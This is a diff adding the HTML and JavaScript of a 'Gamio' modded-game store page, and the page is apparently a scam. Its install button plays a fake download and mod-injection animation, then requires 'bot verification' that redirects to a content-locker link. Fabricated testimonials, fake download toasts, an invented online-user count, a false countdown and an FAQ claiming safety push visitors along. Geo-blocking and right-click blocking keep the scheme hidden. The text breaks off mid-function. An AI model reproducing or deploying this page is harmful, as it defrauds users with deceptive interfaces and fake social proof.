@@ -1,1 +1,755 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Gamio | Premium Modded Store</title>
+    
+    <meta content="Gamio : Premium modded apps collection" property="og:title">
+    <meta content="Discover premium modded apps and games at GAMIO Store. Safe downloads, exclusive features, and fast servers." property="og:description">
+    <meta name="keywords" content="modded apps, mobile games, premium mods, GAMIO store, android mods, ios mods">
+    <meta content="https://gamio.my.to/" property="og:url">
+    <link rel="icon" href="https://i.ibb.co/jPMFX1N1/apple-touch-icon.png" type="image/png">
+    <link href="https://gamio.my.to/" rel="canonical">
 
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <script>
+        // Minified Critical Logic for fast execution
+        const disallowedCountryCodes = ['MX', 'EG', 'DZ', 'TN', 'IN', 'BD'];
+        const flagKey = 'restricted';
+        const southAsiaTimezones = ["Asia/Kolkata", "Asia/Dhaka", "Asia/Kathmandu"];
+        const tzName = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+        function redirectUser() {
+            document.body.innerHTML = '';
+            document.title = '507 Insufficient Storage';
+            window.location.replace("/host.html");
+        }
+
+        async function checkUserCountry() {
+            // Check local storage or timezone first for speed
+            if (localStorage.getItem(flagKey) === '1' || tzName.startsWith("Africa/") || southAsiaTimezones.includes(tzName)) {
+                redirectUser();
+                return;
+            }
+            try {
+                const response = await fetch('https://gamio-geo.axen.workers.dev');
+                const data = await response.json();
+                if (disallowedCountryCodes.includes(data.countryCode)) {
+                    localStorage.setItem(flagKey, '1');
+                    redirectUser();
+                }
+            } catch (error) { console.error('Geo check failed', error); }
+        }
+        checkUserCountry();
+    </script>
+
+    <style>
+        :root {
+            /* Modern Palette */
+            --bg-deep: #050511;
+            --bg-card: #0f1026;
+            --bg-card-hover: #181935;
+            --primary: #6c5ce7;
+            --primary-glow: rgba(108, 92, 231, 0.4);
+            --accent: #00cec9;
+            --text-main: #ffffff;
+            --text-muted: #a2aab9;
+            --glass-border: rgba(255, 255, 255, 0.08);
+            --glass-bg: rgba(15, 16, 38, 0.7);
+            --radius: 16px;
+            --font-main: 'Outfit', sans-serif;
+            --shadow-soft: 0 10px 30px -10px rgba(0,0,0,0.5);
+            --transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
+        
+        body {
+            background-color: var(--bg-deep);
+            color: var(--text-main);
+            font-family: var(--font-main);
+            overflow-x: hidden;
+            background-image: 
+                radial-gradient(circle at 15% 50%, rgba(108, 92, 231, 0.08), transparent 25%),
+                radial-gradient(circle at 85% 30%, rgba(0, 206, 201, 0.05), transparent 25%);
+        }
+
+        body.modal-open { overflow: hidden; }
+
+        /* --- Header --- */
+        header {
+            background: rgba(5, 5, 17, 0.85);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            border-bottom: 1px solid var(--glass-border);
+            padding: 15px 0;
+        }
+
+        .container { max-width: 1200px; margin: 0 auto; padding: 0 20px; }
+
+        .header-content { display: flex; align-items: center; justify-content: space-between; }
+        
+        .logo { display: flex; align-items: center; gap: 12px; }
+        .logo i { font-size: 2rem; background: linear-gradient(45deg, var(--primary), var(--accent)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .logo-text h1 { font-size: 1.4rem; font-weight: 700; letter-spacing: -0.5px; }
+        .logo-text p { font-size: 0.75rem; color: var(--text-muted); font-weight: 300; }
+
+        /* --- Search --- */
+        .search-wrapper { margin: 30px 0; position: relative; max-width: 600px; margin-left: auto; margin-right: auto; }
+        .search-wrapper input {
+            width: 100%;
+            background: var(--bg-card);
+            border: 1px solid var(--glass-border);
+            padding: 16px 50px;
+            border-radius: 50px;
+            color: white;
+            font-size: 1rem;
+            font-family: var(--font-main);
+            transition: var(--transition);
+        }
+        .search-wrapper input:focus { border-color: var(--primary); box-shadow: 0 0 15px var(--primary-glow); }
+        .search-icon { position: absolute; left: 20px; top: 50%; transform: translateY(-50%); color: var(--text-muted); }
+
+        /* --- Section Titles --- */
+        .section-header { display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px; }
+        .section-title { font-size: 1.5rem; font-weight: 700; position: relative; padding-left: 15px; }
+        .section-title::before { content: ''; position: absolute; left: 0; top: 10%; height: 80%; width: 4px; background: var(--primary); border-radius: 4px; box-shadow: 0 0 10px var(--primary); }
+        .view-all { color: var(--accent); text-decoration: none; font-size: 0.9rem; font-weight: 500; display: flex; align-items: center; gap: 6px; }
+
+        /* --- Loaders --- */
+        .loader { text-align: center; padding: 40px; color: var(--text-muted); font-size: 1.1rem; display: flex; justify-content: center; gap: 10px; }
+        .loader i { color: var(--primary); }
+
+        /* --- Featured Games (Horizontal Scroll) --- */
+        .featured-scroll { overflow-x: hidden; padding: 10px 0 30px; position: relative; }
+        .featured-track { display: flex; gap: 20px; transition: transform 0.5s cubic-bezier(0.25, 0.8, 0.25, 1); width: max-content; }
+        
+        .feat-card {
+            width: 160px;
+            background: var(--bg-card);
+            border-radius: var(--radius);
+            padding: 12px;
+            cursor: pointer;
+            border: 1px solid var(--glass-border);
+            transition: var(--transition);
+        }
+        .feat-card:hover { transform: translateY(-8px); border-color: var(--primary); box-shadow: var(--shadow-soft); }
+        .feat-img { width: 100%; aspect-ratio: 1/1; border-radius: 12px; object-fit: cover; margin-bottom: 10px; background: #222; }
+        .feat-title { font-size: 0.9rem; font-weight: 600; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; margin-bottom: 4px; }
+        .rating { color: #ffd700; font-size: 0.8rem; font-weight: 600; }
+
+        /* --- Main Grid --- */
+        .games-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(240px, 1fr)); gap: 24px; padding-bottom: 40px; }
+        
+        .game-card {
+            background: var(--bg-card);
+            border: 1px solid var(--glass-border);
+            border-radius: var(--radius);
+            overflow: hidden;
+            cursor: pointer;
+            transition: var(--transition);
+            position: relative;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .game-card:hover { transform: translateY(-8px); border-color: rgba(108, 92, 231, 0.5); box-shadow: 0 15px 30px rgba(0,0,0,0.3); }
+
+        .card-img-wrap {
+            width: 100%;
+            aspect-ratio: 16/9;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        /* Glass blur effect on image background */
+        .card-img-wrap::before {
+            content: ''; position: absolute; inset: 0;
+            background-image: var(--bg-image); background-size: cover; background-position: center;
+            filter: blur(15px) brightness(0.6); opacity: 0.8; z-index: 1;
+        }
+        
+        .card-img {
+            position: relative; z-index: 2; width: 100%; height: 100%; object-fit: contain;
+            transition: transform 0.4s ease;
+        }
+        .game-card:hover .card-img { transform: scale(1.05); }
+
+        .card-badge { position: absolute; top: 10px; right: 10px; background: var(--primary); color: white; padding: 4px 8px; border-radius: 6px; font-size: 0.7rem; font-weight: 700; z-index: 3; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
+
+        .card-body { padding: 16px; flex: 1; display: flex; flex-direction: column; }
+        .card-title { font-size: 1.1rem; font-weight: 600; margin-bottom: 5px; display: flex; align-items: center; gap: 6px; }
+        .verified-icon { color: var(--accent); font-size: 0.9rem; }
+        .card-dev { font-size: 0.8rem; color: var(--text-muted); margin-bottom: 10px; }
+        .card-desc { font-size: 0.85rem; color: var(--text-muted); line-height: 1.5; margin-bottom: 15px; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
+        
+        .card-meta { display: flex; justify-content: space-between; align-items: center; margin-top: auto; padding-top: 15px; border-top: 1px solid var(--glass-border); }
+        .platform-icons i { margin-right: 8px; font-size: 1.1rem; color: var(--text-muted); }
+        .download-btn-sm { background: rgba(255,255,255,0.05); color: var(--primary); border: none; padding: 6px 12px; border-radius: 8px; font-size: 0.8rem; font-weight: 600; transition: var(--transition); }
+        .game-card:hover .download-btn-sm { background: var(--primary); color: white; }
+
+        /* --- Offer Banner --- */
+        .offer-banner {
+            background: linear-gradient(135deg, var(--primary), #4834d4);
+            border-radius: var(--radius);
+            padding: 25px;
+            margin: 30px 0;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            box-shadow: 0 10px 40px rgba(108, 92, 231, 0.3);
+            position: relative; overflow: hidden;
+        }
+        .offer-banner::after { content: ''; position: absolute; width: 150px; height: 150px; background: rgba(255,255,255,0.1); border-radius: 50%; top: -50px; right: -20px; filter: blur(20px); }
+        .offer-text h3 { font-size: 1.3rem; margin-bottom: 5px; }
+        .offer-timer { background: rgba(0,0,0,0.2); padding: 8px 16px; border-radius: 8px; font-weight: 700; font-family: monospace; font-size: 1.2rem; z-index: 2; }
+
+        /* --- FAQ --- */
+        .faq-item { background: var(--bg-card); border-radius: 12px; margin-bottom: 10px; overflow: hidden; border: 1px solid var(--glass-border); }
+        .faq-question { padding: 18px; cursor: pointer; display: flex; justify-content: space-between; font-weight: 500; transition: background 0.2s; }
+        .faq-question:hover { background: rgba(255,255,255,0.02); }
+        .faq-answer { max-height: 0; overflow: hidden; transition: 0.3s ease; padding: 0 18px; color: var(--text-muted); font-size: 0.9rem; }
+        .faq-answer.open { padding-bottom: 18px; }
+
+        /* --- Footer --- */
+        .footer { text-align: center; padding: 40px 0; margin-top: 40px; border-top: 1px solid var(--glass-border); color: var(--text-muted); font-size: 0.9rem; }
+        .trust-badges { display: flex; justify-content: center; gap: 15px; margin-bottom: 20px; flex-wrap: wrap; }
+        .trust-item { background: rgba(255,255,255,0.05); padding: 6px 14px; border-radius: 50px; font-size: 0.8rem; display: flex; align-items: center; gap: 6px; }
+        .trust-item i { color: var(--accent); }
+
+        /* --- MODAL --- */
+        .modal-overlay {
+            position: fixed; inset: 0; background: rgba(0,0,0,0.8);
+            backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px);
+            z-index: 1000; opacity: 0; visibility: hidden;
+            display: flex; align-items: center; justify-content: center;
+            transition: var(--transition);
+        }
+        .modal-overlay.active { opacity: 1; visibility: visible; }
+        
+        .modal-box {
+            background: #12122b; width: 95%; max-width: 450px; border-radius: 20px;
+            border: 1px solid var(--glass-border);
+            transform: translateY(50px); transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            max-height: 90vh; overflow-y: auto; position: relative;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
+        }
+        .modal-overlay.active .modal-box { transform: translateY(0); }
+
+        .modal-close { position: absolute; top: 15px; right: 15px; width: 32px; height: 32px; border-radius: 50%; background: rgba(255,255,255,0.1); border: none; color: white; cursor: pointer; z-index: 10; display: flex; align-items: center; justify-content: center; font-size: 1.2rem; transition: 0.2s; }
+        .modal-close:hover { background: rgba(255,255,255,0.2); transform: rotate(90deg); }
+
+        .modal-banner { height: 180px; position: relative; overflow: hidden; display: flex; align-items: center; justify-content: center; background: #000; }
+        .modal-banner::before { content: ''; position: absolute; inset: 0; background-image: var(--banner-bg); background-size: cover; filter: blur(12px) brightness(0.5); }
+        .modal-icon { width: 100px; height: 100px; border-radius: 18px; position: relative; z-index: 2; box-shadow: 0 10px 20px rgba(0,0,0,0.4); object-fit: cover; }
+
+        .modal-content { padding: 25px; }
+        .modal-title { font-size: 1.4rem; font-weight: 700; margin-bottom: 5px; text-align: center; }
+        .modal-stats { display: flex; justify-content: center; gap: 15px; color: var(--text-muted); font-size: 0.85rem; margin-bottom: 20px; }
+        
+        .testimonial { background: rgba(108, 92, 231, 0.1); border-left: 3px solid var(--primary); padding: 12px; border-radius: 0 8px 8px 0; margin-bottom: 20px; font-size: 0.9rem; font-style: italic; }
+        
+        .main-btn {
+            width: 100%; padding: 16px; border: none; border-radius: 12px;
+            background: linear-gradient(90deg, var(--primary), #4834d4);
+            color: white; font-size: 1rem; font-weight: 600; cursor: pointer;
+            box-shadow: 0 5px 20px rgba(108, 92, 231, 0.4);
+            transition: var(--transition); display: flex; align-items: center; justify-content: center; gap: 10px;
+            position: relative; overflow: hidden;
+        }
+        .main-btn::after { content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent); transition: 0.5s; }
+        .main-btn:hover { transform: translateY(-2px); box-shadow: 0 10px 25px rgba(108, 92, 231, 0.5); }
+        .main-btn:hover::after { left: 100%; }
+        
+        /* --- Processing Screen --- */
+        .processing-screen {
+            position: fixed; inset: 0; background: var(--bg-deep); z-index: 2000;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            opacity: 0; visibility: hidden; transition: 0.3s;
+        }
+        .processing-screen.active { opacity: 1; visibility: visible; }
+        
+        .spinner-box { width: 80px; height: 80px; position: relative; margin-bottom: 30px; }
+        .spinner { width: 100%; height: 100%; border: 4px solid rgba(108, 92, 231, 0.2); border-top-color: var(--primary); border-radius: 50%; animation: spin 1s linear infinite; }
+        .check-icon { position: absolute; inset: 0; display: flex; align-items: center; justify-content: center; font-size: 2rem; color: #00cec9; opacity: 0; transition: 0.3s; transform: scale(0.5); }
+        
+        .process-title { font-size: 1.5rem; margin-bottom: 10px; }
+        .process-bar-wrap { width: 300px; height: 6px; background: rgba(255,255,255,0.1); border-radius: 3px; margin: 20px 0; overflow: hidden; }
+        .process-bar { height: 100%; background: var(--accent); width: 0%; transition: width 0.2s; box-shadow: 0 0 10px var(--accent); }
+        
+        .steps-list { width: 300px; text-align: left; }
+        .step { display: flex; align-items: center; gap: 10px; margin-bottom: 12px; opacity: 0.4; transition: 0.3s; font-size: 0.9rem; }
+        .step.active { opacity: 1; color: white; }
+        .step.done { color: var(--accent); }
+        .step i { width: 20px; }
+
+        .verify-btn { animation: pulse 2s infinite; background: linear-gradient(45deg, #00b894, #00cec9); }
+
+        /* --- Notifications --- */
+        .toast { position: fixed; bottom: 20px; left: 20px; background: rgba(25, 26, 50, 0.95); border: 1px solid var(--glass-border); padding: 12px 20px; border-radius: 50px; display: flex; align-items: center; gap: 12px; z-index: 100; box-shadow: var(--shadow-soft); font-size: 0.85rem; transform: translateY(100px); transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+        .toast.show { transform: translateY(0); }
+        .toast-img { width: 30px; height: 30px; background: var(--primary); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; color: white; }
+        
+        .online-count { position: fixed; bottom: 20px; right: 20px; background: rgba(0,0,0,0.8); padding: 8px 16px; border-radius: 30px; font-size: 0.75rem; border: 1px solid var(--glass-border); z-index: 99; display: flex; align-items: center; gap: 8px; }
+        .dot { width: 8px; height: 8px; background: #00cec9; border-radius: 50%; box-shadow: 0 0 10px #00cec9; animation: blink 2s infinite; }
+
+        /* Animation Keyframes */
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+        @keyframes pulse { 0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(0, 206, 201, 0.7); } 70% { transform: scale(1.02); box-shadow: 0 0 0 10px rgba(0, 206, 201, 0); } 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(0, 206, 201, 0); } }
+
+        /* Mobile Responsive */
+        @media (max-width: 768px) {
+            .games-grid { grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); gap: 15px; }
+            .card-body { padding: 12px; }
+            .card-title { font-size: 1rem; }
+            .search-wrapper { margin: 20px 0; }
+            .offer-banner { flex-direction: column; text-align: center; gap: 15px; }
+            .offer-banner::after { display: none; }
+        }
+    </style>
+    
+    <noscript>
+        <style>body{display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:#fff;text-align:center;padding:20px;}</style>
+        <div><h1>JavaScript Required</h1><p>Please enable JavaScript to use Gamio Store.</p></div>
+    </noscript>
+</head>
+<body>
+
+    <header>
+        <div class="container header-content">
+            <div class="logo">
+                <i class="fas fa-gamepad"></i>
+                <div class="logo-text">
+                    <h1>GAMIO</h1>
+                    <p>Premium Mod Store</p>
+                </div>
+            </div>
+            </div>
+    </header>
+
+    <main class="container">
+        
+        <div class="search-wrapper">
+            <i class="fas fa-search search-icon"></i>
+            <input type="text" id="searchInput" placeholder="Search games, mods, hacks..." aria-label="Search">
+        </div>
+
+        <section>
+            <div class="section-header">
+                <h2 class="section-title">Featured Mods</h2>
+            </div>
+            <div class="featured-scroll" id="featuredWrapper">
+                <div class="loader" id="featLoader"><i class="fas fa-circle-notch fa-spin"></i> Loading...</div>
+                <div class="featured-track" id="featuredContainer"></div>
+            </div>
+        </section>
+
+        <div class="offer-banner">
+            <div class="offer-text">
+                <h3><i class="fas fa-fire-alt"></i> Limited Time Offer!</h3>
+                <p>Unlock premium mod packs instantly. Offer ends soon.</p>
+            </div>
+            <div class="offer-timer" id="countdown">23:59:59</div>
+        </div>
+
+        <section id="gamesSection">
+            <div class="section-header">
+                <h2 class="section-title">Latest Uploads</h2>
+                <a href="#" class="view-all">View All <i class="fas fa-arrow-right"></i></a>
+            </div>
+            
+            <div class="games-grid" id="allGamesContainer">
+                <div class="loader" id="mainLoader"><i class="fas fa-circle-notch fa-spin"></i> Fetching Games...</div>
+            </div>
+        </section>
+
+        <section>
+            <div class="section-header">
+                <h2 class="section-title">Trending Now</h2>
+            </div>
+            <div class="featured-scroll">
+                <div class="featured-track" id="trendingContainer"></div>
+            </div>
+        </section>
+
+        <section class="faq-section">
+            <div class="section-header"><h2 class="section-title">FAQ</h2></div>
+            <div class="faq-list">
+                <article class="faq-item">
+                    <div class="faq-question"><span>Is this safe?</span> <i class="fas fa-plus"></i></div>
+                    <div class="faq-answer">Yes! All mods are scanned daily. We prioritize user safety.</div>
+                </article>
+                <article class="faq-item">
+                    <div class="faq-question"><span>Do I need to root/jailbreak?</span> <i class="fas fa-plus"></i></div>
+                    <div class="faq-answer">No, 95% of our mods work on standard devices without root.</div>
+                </article>
+                <article class="faq-item">
+                    <div class="faq-question"><span>Why verify?</span> <i class="fas fa-plus"></i></div>
+                    <div class="faq-answer">Verification prevents bot abuse and keeps our servers fast for real humans.</div>
+                </article>
+            </div>
+        </section>
+
+        <footer class="footer">
+            <div class="trust-badges">
+                <div class="trust-item"><i class="fas fa-shield-alt"></i> Safe</div>
+                <div class="trust-item"><i class="fas fa-check-circle"></i> Verified</div>
+                <div class="trust-item"><i class="fas fa-bolt"></i> Fast</div>
+            </div>
+            <p>&copy; 2024 Gamio Store. All rights reserved.</p>
+        </footer>
+
+    </main>
+
+    <div class="online-count">
+        <span class="dot"></span> <span id="userCount">1,402</span> online
+    </div>
+
+    <div class="toast" id="socialToast">
+        <div class="toast-img">A</div>
+        <div class="toast-msg"><strong>Alex</strong> downloaded <strong>GTA V</strong></div>
+    </div>
+
+    <div class="modal-overlay" id="installModal">
+        <div class="modal-box">
+            <button class="modal-close" id="closeModal">&times;</button>
+            
+            <div class="modal-banner" id="modalBanner">
+                <img src="" class="modal-icon" id="modalIcon" alt="Game Icon">
+            </div>
+
+            <div class="modal-content">
+                <h2 class="modal-title" id="modalTitle">Game Title</h2>
+                <div class="modal-stats">
+                    <span><i class="fas fa-download"></i> <span id="modalDownloads">1.2M</span></span>
+                    <span><i class="fas fa-star" style="color:#ffd700"></i> <span id="modalRating">4.9</span></span>
+                    <span><i class="fas fa-check-circle" style="color:var(--accent)"></i> Verified</span>
+                </div>
+
+                <div class="testimonial" id="modalTestimonial">
+                    "Works perfectly! Unlocked everything instantly." - User123
+                </div>
+
+                <p style="margin-bottom:20px; color:var(--text-muted); font-size:0.9rem;" id="modalDesc">
+                    Description goes here...
+                </p>
+
+                <div id="installActions">
+                    <button class="main-btn" id="startInstallBtn">
+                        <i class="fas fa-download"></i> Start Installation
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="processing-screen" id="processScreen">
+        <div class="spinner-box">
+            <div class="spinner"></div>
+            <div class="check-icon"><i class="fas fa-check"></i></div>
+        </div>
+        
+        <h2 class="process-title">Processing...</h2>
+        <p style="color:var(--text-muted)" id="processMsg">Connecting to server...</p>
+        
+        <div class="process-bar-wrap">
+            <div class="process-bar" id="processBar"></div>
+        </div>
+
+        <div class="steps-list" id="stepsList">
+            <div class="step" id="step1"><i class="fas fa-mobile-alt"></i> Device Check</div>
+            <div class="step" id="step2"><i class="fas fa-cloud-download-alt"></i> Downloading Files</div>
+            <div class="step" id="step3"><i class="fas fa-cog"></i> Injecting Mod</div>
+            <div class="step" id="step4"><i class="fas fa-check-double"></i> Finalizing</div>
+        </div>
+
+        <div id="verifyContainer" style="display:none; text-align:center; margin-top:20px; width:100%; max-width:300px;">
+            <p style="margin-bottom:15px;">Bot verification required to complete.</p>
+            <button class="main-btn verify-btn" onclick="showLocker()">Verify Now</button>
+        </div>
+    </div>
+
+    <script>
+        // --- DATA & CONFIG ---
+        const API_URL = "https://api.npoint.io/85ad16ea92a2016db5f5";
+        const FEAT_IDS = ["Ride5mobile", "Ridersrepublicmobile", "Rooftops", "Beamngdrivemobile", "the-last-of-us-2-mobile", "god-of-war-mobile", "rdr2-mobile"];
+        const TREND_IDS = ["gta-5-mobile", "attack-on-titan-2-mobile", "rdr2-mobile"];
+        
+        let allGamesData = [];
+        let currentGame = null;
+
+        // --- DOM ELEMENTS ---
+        const els = {
+            featContainer: document.getElementById('featuredContainer'),
+            allContainer: document.getElementById('allGamesContainer'),
+            trendContainer: document.getElementById('trendingContainer'),
+            featLoader: document.getElementById('featLoader'),
+            mainLoader: document.getElementById('mainLoader'),
+            modal: document.getElementById('installModal'),
+            processScreen: document.getElementById('processScreen'),
+            processBar: document.getElementById('processBar'),
+            processMsg: document.getElementById('processMsg'),
+            steps: [document.getElementById('step1'), document.getElementById('step2'), document.getElementById('step3'), document.getElementById('step4')]
+        };
+
+        // --- INIT ---
+        window.addEventListener('DOMContentLoaded', () => {
+            fetchGames();
+            initCountdown();
+            initFAQ();
+            initSocialProof();
+            initAntiDebug();
+        });
+
+        // --- FETCH LOGIC ---
+        async function fetchGames() {
+            try {
+                const res = await fetch(API_URL);
+                allGamesData = await res.json();
+                
+                els.featLoader.style.display = 'none';
+                els.mainLoader.style.display = 'none';
+                
+                renderFeatured();
+                renderAll();
+                renderTrending();
+                initAutoScroll();
+                
+            } catch (err) {
+                console.error(err);
+                els.mainLoader.innerHTML = '<span style="color:red">Failed to load games. Refresh page.</span>';
+            }
+        }
+
+        // --- RENDERING ---
+        function renderFeatured() {
+            els.featContainer.innerHTML = '';
+            allGamesData.filter(g => FEAT_IDS.includes(g.id)).forEach(g => {
+                const card = document.createElement('div');
+                card.className = 'feat-card';
+                card.onclick = () => openModal(g);
+                card.innerHTML = `
+                    <img src="${g.image}" class="feat-img" loading="lazy" alt="${g.title}">
+                    <div class="feat-title">${g.title}</div>
+                    <div class="rating">★ ${g.rating}</div>
+                `;
+                els.featContainer.appendChild(card);
+            });
+        }
+
+        function renderAll(list = allGamesData) {
+            els.allContainer.innerHTML = '';
+            list.forEach(g => {
+                const card = document.createElement('article');
+                card.className = 'game-card';
+                card.onclick = () => openModal(g);
+                
+                // Style for dynamic blur background
+                const bgStyle = `background-image: url('${g.image}')`;
+                
+                card.innerHTML = `
+                    <div class="card-img-wrap" style="--bg-image: url('${g.image}')">
+                        <img src="${g.image}" class="card-img" loading="lazy" alt="${g.title}">
+                        <div class="card-badge">MOD</div>
+                    </div>
+                    <div class="card-body">
+                        <h3 class="card-title">${g.title} <i class="fas fa-check-circle verified-icon"></i></h3>
+                        <div class="card-dev">by ${g.author}</div>
+                        <p class="card-desc">${g.description}</p>
+                        <div class="card-meta">
+                            <div class="platform-icons">
+                                ${g.platforms.includes('android') ? '<i class="fab fa-android"></i>' : ''}
+                                ${g.platforms.includes('ios') ? '<i class="fab fa-apple"></i>' : ''}
+                            </div>
+                            <button class="download-btn-sm">Download</button>
+                        </div>
+                    </div>
+                `;
+                els.allContainer.appendChild(card);
+            });
+        }
+
+        function renderTrending() {
+            els.trendContainer.innerHTML = '';
+            allGamesData.filter(g => TREND_IDS.includes(g.id)).forEach(g => {
+                // Reuse featured card style for trending for consistency
+                const card = document.createElement('div');
+                card.className = 'feat-card';
+                card.onclick = () => openModal(g);
+                card.innerHTML = `
+                    <img src="${g.image}" class="feat-img" loading="lazy" alt="${g.title}">
+                    <div class="feat-title">${g.title}</div>
+                    <div class="rating">★ ${g.rating} Trending</div>
+                `;
+                els.trendContainer.appendChild(card);
+            });
+        }
+
+        // --- SEARCH ---
+        document.getElementById('searchInput').addEventListener('input', (e) => {
+            const term = e.target.value.toLowerCase();
+            const filtered = allGamesData.filter(g => 
+                g.title.toLowerCase().includes(term) || 
+                g.description.toLowerCase().includes(term)
+            );
+            renderAll(filtered);
+        });
+
+        // --- MODAL & INSTALL LOGIC ---
+        function openModal(game) {
+            currentGame = game;
+            document.getElementById('modalTitle').innerText = game.title;
+            document.getElementById('modalDownloads').innerText = game.downloads || '1M+';
+            document.getElementById('modalRating').innerText = game.rating;
+            document.getElementById('modalDesc').innerText = game.longDesc || game.description;
+            document.getElementById('modalIcon').src = game.image;
+            document.getElementById('modalBanner').style.setProperty('--banner-bg', `url('${game.image}')`);
+            
+            // Random testimonial update
+            const names = ["Mike", "Sarah", "Tom", "Emma", "David"];
+            const name = names[Math.floor(Math.random() * names.length)];
+            document.getElementById('modalTestimonial').innerText = `"${game.title} works great on my phone! Thanks!" - ${name}`;
+
+            els.modal.classList.add('active');
+            document.body.classList.add('modal-open');
+        }
+
+        document.getElementById('closeModal').onclick = () => {
+            els.modal.classList.remove('active');
+            document.body.classList.remove('modal-open');
+        };
+
+        document.getElementById('startInstallBtn').onclick = () => {
+            els.modal.classList.remove('active');
+            els.processScreen.classList.add('active');
+            runFakeInstall();
+        };
+
+        function runFakeInstall() {
+            // Reset UI
+            els.processBar.style.width = '0%';
+            document.querySelector('.check-icon').style.opacity = '0';
+            document.querySelector('.spinner').style.display = 'block';
+            document.getElementById('verifyContainer').style.display = 'none';
+            els.steps.forEach(s => s.className = 'step');
+
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += Math.random() * 2;
+                if(progress > 100) progress = 100;
+                
+                els.processBar.style.width = `${progress}%`;
+
+                // Logic for steps
+                if(progress > 10) els.steps[0].classList.add('active');
+                if(progress > 30) { els.steps[0].classList.add('done'); els.steps[1].classList.add('active'); els.processMsg.innerText = "Downloading files..."; }
+                if(progress > 60) { els.steps[1].classList.add('done'); els.steps[2].classList.add('active'); els.processMsg.innerText = "Unpacking & Injecting..."; }
+                if(progress > 85) { els.steps[2].classList.add('done'); els.steps[3].classList.add('active'); els.processMsg.innerText = "Finalizing installation..."; }
+
+                if(progress >= 100) {
+                    clearInterval(interval);
+                    els.steps[3].classList.add('done');
+                    els.processMsg.innerText = "Verification Required!";
+                    document.querySelector('.spinner').style.display = 'none';
+                    document.querySelector('.check-icon').style.opacity = '1';
+                    document.getElementById('verifyContainer').style.display = 'block';
+                }
+            }, 100);
+        }
+
+        // --- LOCKER REDIRECT ---
+        window.showLocker = function() {
+            window.location = "https://lockedapp.org/cl/i/von95x";
+        }
+
+        // --- UTILS (Scrolling, FAQ, etc) ---
+        function initAutoScroll() {
+            const track = document.getElementById('featuredContainer');
+            let scrollAmount = 0;
+            let direction = 1;
+            
+            setInterval(() => {
+                // Only scroll if not hovering
+                if(!track.matches(':hover')) {
+                    scrollAmount += (180 * direction); // card width + gap
+                    if(scrollAmount >= track.scrollWidth - track.clientWidth) direction = -1;
+                    if(scrollAmount <= 0) direction = 1;
+                    track.style.transform = `translateX(-${Math.max(0, scrollAmount)}px)`;
+                }
+            }, 2500);
+        }
+
+        function initFAQ() {
+            document.querySelectorAll('.faq-question').forEach(q => {
+                q.addEventListener('click', () => {
+                    const answer = q.nextElementSibling;
+                    const icon = q.querySelector('i');
+                    const isOpen = answer.classList.contains('open');
+                    
+                    document.querySelectorAll('.faq-answer').forEach(a => a.classList.remove('open'));
+                    document.querySelectorAll('.faq-question i').forEach(i => i.className = 'fas fa-plus');
+
+                    if(!isOpen) {
+                        answer.classList.add('open');
+                        icon.className = 'fas fa-minus';
+                    }
+                });
+            });
+        }
+
+        function initCountdown() {
+            const el = document.getElementById('countdown');
+            let h=23, m=59, s=59;
+            setInterval(() => {
+                s--;
+                if(s<0){s=59; m--;}
+                if(m<0){m=59; h--;}
+                el.innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
+            }, 1000);
+        }
+
+        function initSocialProof() {
+            const toast = document.getElementById('socialToast');
+            const msgs = [
+                {name: "User12", game: "GTA 5"},
+                {name: "Alex_K", game: "Minecraft"},
+                {name: "Sarah99", game: "Roblox Mod"},
+                {name: "J_Smith", game: "COD Mobile"}
+            ];
+            
+            setInterval(() => {
+                const data = msgs[Math.floor(Math.random() * msgs.length)];
+                toast.querySelector('.toast-img').innerText = data.name[0];
+                toast.querySelector('.toast-msg').innerHTML = `<strong>${data.name}</strong> installed <strong>${data.game}</strong>`;
+                toast.classList.add('show');
+                setTimeout(() => toast.classList.remove('show'), 5000);
+            }, 15000);
+
+            // Fake user count fluctuation
+            const countEl = document.getElementById('userCount');
+            let count = 1402;
+            setInterval(() => {
+                count += Math.floor(Math.random() * 5) - 2;
+                countEl.innerText = count.toLocaleString();
+            }, 3000);
+        }
+
+        function initAntiDebug() {
+            document.addEventListener("contextmenu", e => e.preventDefault());
